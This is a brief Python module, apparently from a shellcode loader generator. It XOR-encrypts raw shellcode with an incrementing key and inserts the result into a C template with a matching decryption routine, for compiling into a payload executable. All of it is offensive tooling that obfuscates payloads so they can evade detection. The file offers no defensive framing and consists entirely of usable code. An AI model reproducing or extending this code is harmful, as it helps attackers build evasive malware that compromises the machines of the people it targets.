## Encryption module snippets

# XOR Snippets:
XOR_DECRYPT = """
unsigned char Shellcode[] = {{{xor_enc_shellcode}}};

SIZE_T sShellcodeSize = sizeof(Shellcode);
BYTE bKey = 0b{xor_key};

void XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {{
	for (size_t i = 0; i < sShellcodeSize; i++) {{
		pShellcode[i] = pShellcode[i] ^ (bKey + i);
	}}
}}
"""


def get_xor_shellcode(shellcode: bytes, key: bytes) -> bytes:
        enc_shellcode = []
        for i in range(len(shellcode)):
            key_int = (int.from_bytes(key, byteorder="big") + i)
            enc_shellcode.append(hex(shellcode[i] ^ key_int))
        return ", ".join(enc_shellcode)


def get_encryption_method(encryption_method, shellcode, key=None, iv=None):
    if encryption_method == "xor":
        # xor the shellcode so we can then include it in the decryption snippet/final executable.
        xor_enc_shellcode = get_xor_shellcode(shellcode, bytes([int(key, 2)])) # now we can pass xor_enc_shellcode into the decryption snippet.
        return  XOR_DECRYPT.format(xor_enc_shellcode=xor_enc_shellcode, xor_key=key)
   





